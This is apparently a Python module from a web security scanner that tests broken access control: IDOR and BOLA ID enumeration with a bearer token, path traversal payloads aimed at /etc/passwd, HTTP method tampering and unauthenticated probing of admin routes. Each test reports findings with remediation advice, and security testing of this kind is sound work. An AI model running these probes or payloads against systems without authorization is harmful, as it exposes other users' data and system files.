"""Broken Access Control testing tools module."""
import logging
from typing import Dict, Any, List
from models.session import Finding
from tools.base import BaseTool

logger = logging.getLogger(__name__)


class AccessControlTools(BaseTool):
    @property
    def tool_name(self) -> str:
        return "access_control"

    @property
    def description(self) -> str:
        return "Broken Access Control testing (IDOR, BOLA, Path Traversal, Method Tampering)"

    async def run_access_control(self, session_id: str, target: str, test_type: str = "idor", **kwargs) -> Dict[str, Any]:
        """Run access control tests."""
        if test_type == "idor":
            return await self._run_idor(session_id, target, **kwargs)
        elif test_type == "bola":
            return await self._run_bola(session_id, target, **kwargs)
        elif test_type == "path_traversal":
            return await self._run_path_traversal(session_id, target, **kwargs)
        elif test_type == "method_tampering":
            return await self._run_method_tampering(session_id, target, **kwargs)
        elif test_type == "forced_browsing":
            return await self._run_forced_browsing(session_id, target, **kwargs)
        else:
            return {"findings": [], "raw": {}, "error": f"Unknown test_type: {test_type}"}

    # Task 5.1 – IDOR
    async def _run_idor(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Test Insecure Direct Object Reference."""
        findings = []
        raw = {}

        user_token = kwargs.get("user_token", "")
        if not user_token:
            return {"findings": [], "raw": raw, "error": "user_token required for IDOR test"}

        profile_url = kwargs.get("profile_url", f"{target}/api/users")
        test_ids = kwargs.get("test_ids", [1, 2, 3, 100, 101, 102])

        accessible = []
        for uid in test_ids:
            cmd = (
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-H 'Authorization: Bearer {user_token}' "
                f"{profile_url}/{uid}/profile"
            )
            result = await self._execute(cmd, session_id, timeout=15)
            raw[f"user_{uid}"] = result

            if result.get("returncode") == 0:
                code = result.get("stdout", "").strip()
                if code == "200":
                    accessible.append(str(uid))

        if accessible:
            findings.append(Finding(
                session_id=session_id,
                attack_type="idor",
                confidence=0.9,
                endpoint=profile_url,
                evidence=f"Accessible user profiles without authorization: IDs {', '.join(accessible)}",
                status="confirmed",
                cvss_score=5.3,
                severity="medium",
                remediation="Implement authorization checks on every resource access",
            ))
        else:
            findings.append(Finding(
                session_id=session_id,
                attack_type="idor",
                confidence=0.9,
                endpoint=profile_url,
                evidence="No unauthorized user profiles accessible",
                status="confirmed",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    # Task 5.2 – BOLA on Orders/Documents
    async def _run_bola(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Test Broken Object Level Authorization on orders/documents."""
        findings = []
        raw = {}

        user_token = kwargs.get("user_token", "")
        if not user_token:
            return {"findings": [], "raw": raw, "error": "user_token required for BOLA test"}

        orders_url = kwargs.get("orders_url", f"{target}/api/orders")
        max_id = kwargs.get("max_id", 20)

        accessible_orders = []
        for oid in range(1, max_id + 1):
            cmd = (
                f"curl -s -w '\\n%{{http_code}}' "
                f"-H 'Authorization: Bearer {user_token}' "
                f"{orders_url}/{oid}"
            )
            result = await self._execute(cmd, session_id, timeout=15)
            raw[f"order_{oid}"] = result

            if result.get("returncode") == 0:
                lines = result.get("stdout", "").strip().splitlines()
                if lines:
                    code = lines[-1].strip()
                    if code == "200" and len(lines) > 1:
                        accessible_orders.append(f"{oid}: {lines[0][:100]}")

        if accessible_orders:
            findings.append(Finding(
                session_id=session_id,
                attack_type="bola",
                confidence=0.9,
                endpoint=orders_url,
                evidence=f"Accessible orders belonging to other users: {', '.join(accessible_orders[:5])}",
                status="confirmed",
                cvss_score=5.3,
                severity="medium",
                remediation="Verify object ownership server-side before returning data",
            ))
        else:
            findings.append(Finding(
                session_id=session_id,
                attack_type="bola",
                confidence=0.9,
                endpoint=orders_url,
                evidence="No unauthorized orders accessible",
                status="confirmed",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    # Task 5.3 – Path Traversal
    async def _run_path_traversal(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Test for path traversal vulnerabilities."""
        findings = []
        raw = {}

        files_url = kwargs.get("files_url", f"{target}/api/files")
        payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
        ]

        for payload in payloads:
            cmd = f"curl -s '{files_url}?name={payload}'"
            result = await self._execute(cmd, session_id, timeout=30)
            raw[payload] = result

            if result.get("returncode") == 0:
                stdout = result.get("stdout", "")
                if "root:" in stdout:
                    findings.append(Finding(
                        session_id=session_id,
                        attack_type="path_traversal",
                        confidence=0.95,
                        endpoint=files_url,
                        parameter="name",
                        evidence=f"Path traversal confirmed with payload: {payload}. Output: {stdout[:200]}",
                        status="confirmed",
                        cvss_score=7.5,
                        severity="high",
                        remediation="Validate and sanitize file paths; use allowlists",
                    ))
                    break

        if not findings:
            findings.append(Finding(
                session_id=session_id,
                attack_type="path_traversal",
                confidence=0.8,
                endpoint=files_url,
                evidence="Path traversal payloads did not return file contents",
                status="potential",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    # Task 5.4 – HTTP Method Tampering
    async def _run_method_tampering(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Test non-standard HTTP methods on restricted endpoints."""
        findings = []
        raw = {}

        user_token = kwargs.get("user_token", "")
        admin_endpoint = kwargs.get("admin_endpoint", f"{target}/api/admin/users")
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]

        for method in methods:
            cmd = (
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-X {method} "
                f"-H 'Authorization: Bearer {user_token}' "
                f"{admin_endpoint}"
            )
            result = await self._execute(cmd, session_id, timeout=15)
            raw[method] = result

            if result.get("returncode") == 0:
                code = result.get("stdout", "").strip()
                if code == "200" and method in ["PUT", "PATCH", "DELETE"]:
                    findings.append(Finding(
                        session_id=session_id,
                        attack_type="method_tampering",
                        confidence=0.85,
                        endpoint=admin_endpoint,
                        evidence=f"HTTP {method} accepted on admin endpoint (HTTP 200)",
                        status="confirmed",
                        cvss_score=6.5,
                        severity="medium",
                        remediation="Restrict HTTP methods per endpoint; enforce method-level authorization",
                    ))

        if not findings:
            findings.append(Finding(
                session_id=session_id,
                attack_type="method_tampering",
                confidence=0.9,
                endpoint=admin_endpoint,
                evidence="All HTTP methods properly restricted on admin endpoint",
                status="confirmed",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    # Task 5.5 – Forced Browsing (Unauthenticated Access)
    async def _run_forced_browsing(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Test admin routes without authentication."""
        findings = []
        raw = {}

        endpoints = kwargs.get("endpoints", [
            "/admin", "/admin/users", "/admin/settings",
            "/dashboard", "/internal", "/debug",
            "/actuator", "/health/details",
        ])

        exposed = []
        for ep in endpoints:
            url = f"{target}{ep}"
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' {url}"
            result = await self._execute(cmd, session_id, timeout=15)
            raw[ep] = result

            if result.get("returncode") == 0:
                code = result.get("stdout", "").strip()
                if code in ["200", "301", "302"]:
                    exposed.append(f"{ep} (HTTP {code})")

        if exposed:
            findings.append(Finding(
                session_id=session_id,
                attack_type="forced_browsing",
                confidence=0.9,
                endpoint=target,
                evidence=f"Admin/internal endpoints accessible without auth: {', '.join(exposed)}",
                status="confirmed",
                cvss_score=8.1,
                severity="high",
                remediation="Require authentication on all admin and internal endpoints",
            ))
        else:
            findings.append(Finding(
                session_id=session_id,
                attack_type="forced_browsing",
                confidence=0.95,
                endpoint=target,
                evidence="All admin/internal endpoints require authentication",
                status="confirmed",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}
